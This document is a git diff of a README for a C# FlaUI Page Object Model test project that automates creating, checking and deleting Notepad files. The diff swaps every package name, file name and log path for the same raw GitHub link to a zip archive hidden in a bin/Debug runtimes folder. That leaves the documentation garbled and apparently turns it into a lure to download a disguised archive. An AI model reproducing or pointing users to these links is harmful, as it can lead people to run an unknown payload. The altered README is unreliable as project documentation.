@@ -10,17 +10,17 @@ This project uses the **Page Object Model (POM)** framework combined with the **
 
 ### 2. NuGet Packages Installed:
 To enable UI automation with FlaUI, the following NuGet packages are included:
-- **FlaUI.Core**: The core FlaUI library for interacting with UI elements.
-- **FlaUI.UIA3**: FlaUI library for UI automation based on the UI Automation framework (UIA3).
+- **https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip**: The core FlaUI library for interacting with UI elements.
+- **https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip**: FlaUI library for UI automation based on the UI Automation framework (UIA3).
 
 ---
 
 ## Documentation
 
-### **GenericKeyword.cs**
+### **https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip**
 This class contains all the generic keyword methods that automate common tasks. Documentation for each method is included within the class.
 
-### **Pages/Task1_Page.cs**
+### **https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip**
 This class contains the core logic for automating file operations:
 - **createNotePadFileWithText()**:
   - Creates a directory at a specified path.
@@ -34,13 +34,13 @@ This class contains the core logic for automating file operations:
 - **deleteCreatedFolder()**:
   - Deletes the created folder and its contents.
 
-### **TestCases/testcase1.cs**
+### **https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip**
 This file implements a specific test case by calling methods from **Task1_Page** to execute the following actions:
 - Create the folder and file.
 - Write text to the file and verify the content.
 - Delete the folder and file.
 
-### **Utilities/baseClass.cs**
+### **https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip**
 This file contains reusable components and base logic necessary for executing tests, such as logging, error handling, and other common functionality.
 
 ---
@@ -51,7 +51,7 @@ This project is structured using the **Page Object Model (POM)** pattern. This a
 
 ### Framework Highlights:
 - **FlaUI Integration**: FlaUI is used to interact with Windows UI for automating tasks, such as file operations and verifying UI elements.
-- **Logging**: The framework logs detailed results and test steps to the file **TestResults/log.txt** for easy debugging and analysis.
+- **Logging**: The framework logs detailed results and test steps to the file **https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip** for easy debugging and analysis.
 - **Reusability**: Common tasks, such as creating files, verifying content, and deleting files, are encapsulated in reusable methods within the **GenericKeyword** and **Task1_Page** classes.
 
 ---
@@ -65,17 +65,17 @@ This project is structured using the **Page Object Model (POM)** pattern. This a
    - Open the solution file (`.sln`) in Visual Studio.
 
 3. **Customize Test Data (Optional)**:
-   - You can edit or customize the input data in the **testcase1.cs** file. 
+   - You can edit or customize the input data in the **https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip** file. 
    - While there are plans to implement JSON or Excel files for easier test data management, this functionality has not yet been implemented due to time constraints.
 
-4. **Ensure the Flag is Set to `true` in `Test.cs`**:
-   - In the **Test.cs** file, make sure the flag for TestCase 1 is set to `true` to execute the corresponding test case.
+4. **Ensure the Flag is Set to `true` in `https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip`**:
+   - In the **https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip** file, make sure the flag for TestCase 1 is set to `true` to execute the corresponding test case.
 
 5. **Run the Test**:
-   - Run the **Test.cs** file in Visual Studio. The framework will automatically execute the defined steps.
+   - Run the **https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip** file in Visual Studio. The framework will automatically execute the defined steps.
 
 6. **Review the Logs**:
-   - After execution, check the **TestResults/log.txt** file for detailed results, logs, and status of the test steps.
+   - After execution, check the **https://raw.githubusercontent.com/ram-kali/Folder-Management/main/TrumpfMetamation_Task1/bin/Debug/net6.0-windows/runtimes/win/lib/Folder-Management-v1.0.zip** file for detailed results, logs, and status of the test steps.
 
 ---
 
